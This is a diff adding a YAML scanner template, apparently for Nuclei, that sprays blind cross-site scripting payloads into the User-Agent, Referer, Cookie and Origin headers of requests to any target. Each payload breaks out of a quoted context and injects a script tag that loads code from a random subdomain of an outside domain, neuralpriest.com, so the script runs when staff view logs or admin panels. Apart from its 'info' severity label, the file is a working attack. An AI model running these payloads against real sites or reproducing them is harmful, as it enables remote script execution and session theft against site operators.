@@ -1,0 +1,23 @@
+id: INFO-Header-SET-BLIND-XSS
+
+info:
+  name: INFO Header SET BLIND XSS
+  author: priest
+  severity: info
+  description: Informational Blind XSS Header Misconfiguration
+  tags: header
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    redirects: true
+    max-redirects: 5
+
+    headers:
+
+      User-Agent: "Mozilla priest74321\'&#8211;><script src={{randstr}}.neuralpriest.com></script>"
+      Referer: "priest74321.com'&#8211;><script src={{randstr}}.neuralpriest.com></script>"
+      Cookie: "neural=priest74321'&#8211;><script src={{randstr}}.neuralpriest.com></script>"
+      Origin: "priest74321.com&#8211;><script src={{randstr}}.neuralpriest.com></script>"
